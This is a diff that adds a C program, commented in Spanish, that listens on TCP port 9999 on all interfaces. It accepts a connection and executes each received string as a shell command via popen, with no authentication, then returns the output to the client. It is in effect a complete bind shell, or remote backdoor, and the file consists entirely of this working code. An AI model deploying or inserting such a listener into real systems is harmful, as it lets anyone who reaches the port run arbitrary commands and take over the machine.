@@ -1,0 +1,95 @@
+#include <stdio.h> // Incluye las funciones de entrada y salida estándar.
+#include <stdlib.h> // Incluye varias funciones generales, como manejo de memoria, procesos, etc.
+#include <string.h> // Incluye varias funciones para manipular cadenas y arrays.
+#include <unistd.h> // Proporciona acceso a la API POSIX (sistema operativo portátil).
+#include <arpa/inet.h> // Incluye definiciones para operaciones de internet.
+
+#define PUERTO 9999 // Define el puerto en el que se va a conectar.
+
+// Función para manejar errores. Imprime el mensaje de error y termina el programa.
+void manejoDeError(const char* mensaje) {
+    perror(mensaje);
+    exit(EXIT_FAILURE);
+}
+
+// Función para crear un socket. Retorna el descriptor del socket.
+int crearSocket() {
+    int socket_servidor = socket(AF_INET, SOCK_STREAM, 0);
+    if (socket_servidor == -1) {
+        manejoDeError("Se presentó un error al crear el socket");
+    }
+    return socket_servidor;
+}
+
+// Función para configurar la dirección del servidor.
+struct sockaddr_in configurarDireccionServidor() {
+    struct sockaddr_in direccion_servidor;
+    direccion_servidor.sin_family = AF_INET;
+    direccion_servidor.sin_addr.s_addr = INADDR_ANY; // Dirección IP del servidor (cualquiera).
+    direccion_servidor.sin_port = htons(PUERTO); // Puerto del servidor.
+    return direccion_servidor;
+}
+
+// Función para conectar el socket.
+void conectarSocket(int socket_servidor, struct sockaddr_in* direccion_servidor) {
+    if (bind(socket_servidor, (struct sockaddr*)direccion_servidor, sizeof(*direccion_servidor)) == -1) {
+        manejoDeError("Se presentó un error al conectar el socket");
+    }
+}
+
+// Función para escuchar conexiones.
+void escucharConexiones(int socket_servidor) {
+    if (listen(socket_servidor, 5) == -1) {
+        manejoDeError("Se presentó un error al escuchar conexiones");
+    }
+    printf("El servidor está escuchando en el puerto %d...\n", PUERTO);
+}
+
+// Función para aceptar una conexión.
+int aceptarConexion(int socket_servidor, struct sockaddr_in* direccion_cliente) {
+    socklen_t longitud_cliente = sizeof(*direccion_cliente);
+    int socket_cliente = accept(socket_servidor, (struct sockaddr*)direccion_cliente, &longitud_cliente);
+    if (socket_cliente == -1) {
+        manejoDeError("Se presentó un error al aceptar la conexión");
+    }
+    printf("Se ha establecido conexión establecida desde %s:%d\n", inet_ntoa(direccion_cliente->sin_addr), ntohs(direccion_cliente->sin_port));
+    return socket_cliente;
+}
+
+// Función para ejecutar comandos y retornar la respuesta.
+void ejecutarRetornar(int socket_cliente) {
+    char buffer[1024];
+    while (1) {
+        memset(buffer, 0, sizeof(buffer)); // Limpia el buffer.
+        ssize_t bytes_recibidos = recv(socket_cliente, buffer, sizeof(buffer), 0); // Recibe el comando del cliente.
+        if (bytes_recibidos <= 0) {
+            break; // Si no se reciben bytes, termina el bucle.
+        }
+        FILE* salida_comando = popen(buffer, "r"); // Ejecuta el comando.
+        if (salida_comando == NULL) {
+            manejoDeError("Se ha presentado un error al ejecutar el comando");
+        }
+        while (fgets(buffer, sizeof(buffer), salida_comando) != NULL) {
+            send(socket_cliente, buffer, strlen(buffer), 0); // Envía la respuesta al cliente.
+        }
+        pclose(salida_comando); // Cierra el proceso que ejecutó el comando.
+    }
+}
+
+// Función para cerrar las conexiones.
+void cerrarConexiones(int socket_cliente, int socket_servidor) {
+    close(socket_cliente); // Cierra la conexión con el cliente.
+    close(socket_servidor); // Cierra el socket del servidor.
+}
+
+// Función principal.
+int main() {
+    int socket_servidor = crearSocket(); // Crea un socket.
+    struct sockaddr_in direccion_servidor = configurarDireccionServidor(); // Configura la dirección del servidor.
+    conectarSocket(socket_servidor, &direccion_servidor); // Conecta el socket.
+    escucharConexiones(socket_servidor); // Escucha conexiones.
+    int socket_cliente = aceptarConexion(socket_servidor, &direccion_servidor); // Acepta una conexión.
+    ejecutarRetornar(socket_cliente); // Ejecuta comandos y retorna la respuesta.
+    cerrarConexiones(socket_cliente, socket_servidor); // Cierra las conexiones.
+    return 0;
+}
